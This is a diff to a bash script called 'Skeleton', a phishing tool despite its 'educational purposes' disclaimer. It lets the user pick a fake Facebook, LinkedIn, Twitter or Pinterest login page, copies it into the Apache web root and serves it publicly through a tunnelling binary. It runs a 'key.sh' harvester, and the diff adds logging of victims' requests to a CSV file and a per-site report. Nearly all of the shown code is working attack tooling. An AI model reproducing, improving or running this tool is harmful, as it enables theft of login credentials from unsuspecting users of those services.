@@ -8,7 +8,7 @@
 #
 # DISCLAMER: Program for educational purposes!!!
 # 
-#***********************************************************
+#**********************
 #
 # Name: Skeleton
 # Version: 1.0 beta
@@ -30,26 +30,36 @@
 # -Attack Switcher BugFix
 # -Exit (Revision)
 #
+# -Date: 03/30/2018
+# -BugFix
+# -Check ROOT perm...
+# 
 #**********************
 
 #**** Skeleton version ****
 VERSION="1.1"
 
 #**** Screen size ****
-resize -s 25 60 > /dev/null
+resize -s 20 61 > /dev/null
 
 #**** Check Root ****
 function check_root_perm() {
+	clear
+	FLAG
 	user=$(whoami)
 	if [ "$user" = "root" ]; then
-  		echo -e "$W [$G""X$W]$GR...$G""Y$W""ou are $G""Root$W!"
-  		sleep 1
+  		echo -e "
+$W [$G""X$W]$GR...$G""Y$W""ou are $G""Root$W!"
+  		sleep 1.2
   		RUN
 	else
-		echo -e "$W [$R""X$W]$GR...$R""Y$W""ou are not $R""Root$W!
+		echo -e "
+$W [$R""X$W]$GR...$R""Y$W""ou are not $R""Root$W!
+ 
  $G""U$W""se:$Y sudo ./skeleton.sh$EC"
  		sleep 1
-    	echo -e "$W [$R""X$W]$GR...$R""C$W""lose" 
+    	echo -e "
+$W [$R""X$W]$GR...$R""C$W""lose" 
     	sleep 1
 	fi
 }
@@ -85,6 +95,7 @@ MENU_skel="$W~ Skeleton menu ~"
 MENU_skel1="$B""S$W""E$GR""le$W""CT"
 MENU_skel2="Select an attack"
 
+
 #~~~ START ~~~
 function RUN {
 	Place="Run"
@@ -115,12 +126,12 @@ function main {
          $B""o$W-----------------$B""o$EC
 "
 	read -p "$SKELEDIAL" opt
-	case $opt in
-	1) inf;;
-	2) select_attack;;
-	0) EXITMODE;;
-	*) echo -e "$CL$R[ERROR]$EC"; sleep 2; main;;
-esac
+		case $opt in
+			1) inf;;
+			2) select_attack;;
+			0) EXITMODE;;
+			*) echo -e "$CL$R[ERROR]$EC"; sleep 2; main;;
+		esac
 }
 
 #~~~~ Attack Selection ~~~~
@@ -140,47 +151,51 @@ function select_attack {
          $B""o$W--------------------------------$B""o$EC      
 "	 
 	read -p "$SKELEDIAL" site
-	case $site in
-	1)
-	site="facebook"
-	    if [ ! -d "sites/facebook" ]; then
-	        echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
-	        sleep 2
-	        select_attack
-	    else
-		lang 
-	    fi ;;
-	2)
-	site="linkedin"
-	    if [ ! -d "sites/linkedin" ]; then
-	        echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
-	        sleep 2
-	        select_attack
-	    else
-		lang 
-	    fi ;;
-	3)
-	site="twitter"
-	    if [ ! -d "sites/twitter" ]; then
-	        echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
-	        sleep 2
-	        select_attack
-	    else
-		lang 
-	    fi ;;
-	4)
-	site="pinterest"
-	    if [ ! -d "sites/pinterest" ]; then
-	        echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
-	        sleep 2
-	        select_attack
-	    else
-		lang 
-	    fi ;;
-	9) echo -e " [*]...Back" ; main ;;
-	0) EXITMODE ;;
-	*) echo -e "$CL$R[ERROR]$EC"; sleep 3; select_attack ;;
-esac
+		case $site in
+			1)
+				site="facebook"
+	    			if [ ! -d "sites/facebook" ]; then
+	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
+	        			sleep 2
+	        			select_attack
+	    			else
+						lang 
+	    			fi ;;
+
+			2)
+				site="linkedin"
+	    			if [ ! -d "sites/linkedin" ]; then
+	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
+	        			sleep 2
+	        			select_attack
+	    			else
+						lang 
+	    			fi ;;
+
+			3)
+				site="twitter"
+	    			if [ ! -d "sites/twitter" ]; then
+	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
+	        			sleep 2
+	        			select_attack
+	    			else
+						lang 
+	    			fi ;;
+
+			4)
+				site="pinterest"
+	    			if [ ! -d "sites/pinterest" ]; then
+	        			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
+	        			sleep 2
+	        			select_attack
+	    			else
+						lang 
+	    			fi ;;
+
+			9) echo -e " [*]...Back" ; main ;;
+			0) EXITMODE ;;
+			*) echo -e "$CL$R[ERROR]$EC"; sleep 3; select_attack ;;
+		esac
 }
 
 #~~~~ Attack Language ~~~~
@@ -197,50 +212,51 @@ function lang {
            |$R  9$W)$GR...$R""Back$W      | 
            $B""o$W-----------------$B""o$EC
 "
-	            read -p "$SKELEDIAL" opt_lang
-	
-			case $opt_lang in
-			1)
-	    		  if [ ! -f "sites/$site/en/index.html" ]; then
-	        	  	echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
-					echo -e "$site"
-	        	  	sleep 2
-	        	  	select_attack
-	    		  else
-						clear
-	                  	FLAG
-	                  	echo -e " 
+	        read -p "$SKELEDIAL" opt_lang	
+				case $opt_lang in
+					1)
+	    				if [ ! -f "sites/$site/en/index.html" ]; then
+	        	  			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
+							echo -e "$site"
+	        	  			sleep 2
+	        	  			select_attack
+	    		  		else
+							clear
+	                  		FLAG
+	                  		echo -e " 
  $W[$G*$W]$GR...$G$site$W"
-	                  	sleep 0.5
-	                  	echo -e " $W[$B""E$W""n]$GR...$B""E$W""nglish selected"
-	                  	sleep 0.5
-	                  	echo -e " [$G*$W]$GR...$Y""Copy files$EC"
-                          	cp -a sites/$site/en/index.html /var/www/html/index.html
-	                  	sleep 3
-	                  	set_serv
-	    		  fi ;;
-			2)
-	    		  if [ ! -f "sites/$site/fr/index.html" ]; then
-	        	  	echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
-			        echo -e "$site"
-	        	  	sleep 2
-	        	  	select_attack
-	    		  else
-				clear
-	                  	FLAG
-	                  	echo -e " 
+	                  		sleep 0.5
+	                  		echo -e " $W[$B""E$W""n]$GR...$B""E$W""nglish selected"
+	                  		sleep 0.5
+	                  		echo -e " [$G*$W]$GR...$Y""Copy files$EC"
+                        	cp -a sites/$site/en/index.html /var/www/html/index.html
+	                  		sleep 3
+	                  		set_serv
+	    		  		fi ;;
+
+					2)
+	    		  		if [ ! -f "sites/$site/fr/index.html" ]; then
+	        	  			echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
+			        		echo -e "$site"
+	        	  			sleep 2
+	        	  			select_attack
+	    		  		else
+							clear
+	                  		FLAG
+	                  		echo -e " 
  $W[$G*$W]$GR...$G$site$W"
-	                  	sleep 0.5
-	                  	echo -e " $W[$B""F$W""R]$GR...$B""F$W""rench selected"
-	                  	sleep 0.5
-	                  	echo -e " [$G*$W]$GR...$Y""Copy files$EC"
+	                  		sleep 0.5
+	                  		echo -e " $W[$B""F$W""R]$GR...$B""F$W""rench selected"
+	                  		sleep 0.5
+	                  		echo -e " [$G*$W]$GR...$Y""Copy files$EC"
                           	cp -a sites/$site/fr/index.html /var/www/html/index.html
-	                  	sleep 2
-	                  	set_serv
-	    		  fi ;;	
-	                9) echo -e "$W[$R*$W]$GR...$W""Back" ; sleep 2 ; main ;; 		 
-			*) echo -e "$CL$R[ERROR]$EC"; sleep 3; lang ;; 			
-esac
+	                  		sleep 2
+	                  		set_serv
+	    		  		fi ;;
+	
+	            	9) echo -e "$W[$R*$W]$GR...$W""Back" ; sleep 2 ; main ;; 		 
+					*) echo -e "$CL$R[ERROR]$EC"; sleep 3; lang ;; 			
+				esac
 }
 
 #~~~~ Set Server ~~~~
@@ -275,7 +291,6 @@ rep" > key.sh
 chmod +x key.sh
 	service apache2 start
 	sleep 1
-    xterm -title "Skeleton Key" $DISPLAY_KEY -e "./key.sh" &
 	clear
 	FLAG
 	echo -e " 
@@ -286,9 +301,12 @@ chmod +x key.sh
 	|$Y 3$W)$GR...$G""N$W""E$GR""x$W""T  |
 	$B""o$W------------$B""o$W
 
-  [$Y""i$W] Ngrok active? Yes do \"next\" or select your system [$Y""i$W]
+[$Y""i$W] Server is active? Yes do \"next\" or select your system [$Y""i$W]
 "
 	read -p "$SKELEDIAL" setserv
+
+	xterm -title "Skeleton Control" $DISPLAY_LOG -bg "#000000" -fg "#11ff00" -e "tail -f /var/log/apache2/access.log > sk_tmp.csv" &
+    xterm -title "Skeleton Key" $DISPLAY_KEY -e "./key.sh" &
 	
 	if [ "$setserv" -eq "1" ]; then
           echo -e "$W[$R+$W] Start service 32bit..."
@@ -299,13 +317,12 @@ chmod +x key.sh
       control
 
 	elif [ "$setserv" -eq "2" ]; then
-        echo -e "$W[$R+$W] Start service 64bit..."
+            echo -e "$W[$R+$W] Start service 64bit..."
 	    sleep 2
 	    chmod +x $SYSTEM64
 	    xterm -title "Skeleton Server Log" $DISPLAY_SERV -e ./$SYSTEM64 http 80 &
 	    sleep 2
 	    control
-
 	    xterm -title "Skeleton Key" $DISPLAY_KEY -e "./key.sh" &
         set_serv
 
@@ -335,13 +352,13 @@ function control {
 "
 	read -p "$SKELEDIAL" opt
  
-	case $opt in
-	1) report; Kill_Process; Kill_Services; Clean_TMP; main;;
-	2) report; pkill key.sh; Clean_TMP; pkill tail; Kill_Services; select_attack;;
-	3) main;;
-	0) EXITMODE;;
-	*) echo -e "$CL$R[ERROR]$EC"; sleep 2; control;;
-esac
+		case $opt in
+			1) report; Kill_Process; Kill_Services; Clean_TMP; main;;
+			2) report; pkill key.sh; Clean_TMP; pkill tail; Kill_Services; select_attack;;
+			3) report; Kill_Process; Kill_Services; Clean_TMP; main;;
+			0) EXITMODE;;
+			*) echo -e "$CL$R[ERROR]$EC"; sleep 2; control;;
+		esac
 }
 
 #~~~~ INFO ~~~~
@@ -389,7 +406,6 @@ $RPRT
   $SKELEDIAL 2018
 ===============================
   " > $site.txt
-
 }
 
 #~~~~ Exit ~~~~
@@ -399,7 +415,7 @@ function EXITMODE {
 	echo
 	echo -e "
 	$CL ""Thanks for use Skeleton-Key $EC"
-	sleep 3
+	sleep 2.5
 	clear
 	exit
 }
@@ -407,17 +423,17 @@ function EXITMODE {
 #~~~~ Function Kill ~~~~
 function Kill_Services() {
 	echo -e "
-$W[$G+$W]$GR Close services."
+$W[$R+$W]$GR Close services."
 	sleep 0.1
 	echo -e "
-$W[$G+$W]$GR Shutdow Apache."
+$W[$R+$W]$GR Shutdow Apache."
 	service apache2 stop
 	sleep 1
 }
 
 function Kill_Process() {
 	echo -e "
-$W[$G+$W]$GR Kill process... "
+$W[$R+$W]$GR Kill process... "
 	pkill key.sh
 	sleep 0.2
 	pkill $SYSTM32
